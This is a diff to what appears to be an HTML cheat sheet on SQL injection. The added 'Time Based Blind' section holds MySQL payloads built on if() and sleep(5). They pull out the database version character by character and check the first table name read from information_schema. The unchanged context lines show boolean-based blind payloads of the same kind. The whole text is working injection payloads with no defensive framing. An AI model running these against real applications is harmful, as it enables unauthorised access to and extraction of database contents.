@@ -89,3 +89,16 @@ and ascii(substring(version(),2,1)) = 48 -> Second Character<br>
 
 <b>Table</b><br>
 and ascii(substring((select concat(table_name) from information_schema.tables where table_schema=database()),1,1)) > 100<br>
+
+<h2>Time Based Blind</h2>
+<b>Intro</b>
+SELECT IF(500<1000, "YES", "NO");<br>
+sleep(5);<br>
+and if(500<1000, sleep(5), NULL) -> Sleep<br>
+and if(500>1000, sleep(5), NULL) -> Do Not Sleep<br>
+
+<b>Version</b><br>
+and if(ascii(substr(version(),1,1)) = 49, sleep(5), NULL)<br>
+
+<b>Table</b><br>
+and if(ascii(substr((select concat(table_name) from information_schema.tables where table_schema=database()),1,1)) > 100, sleep(5), NULL)<br>
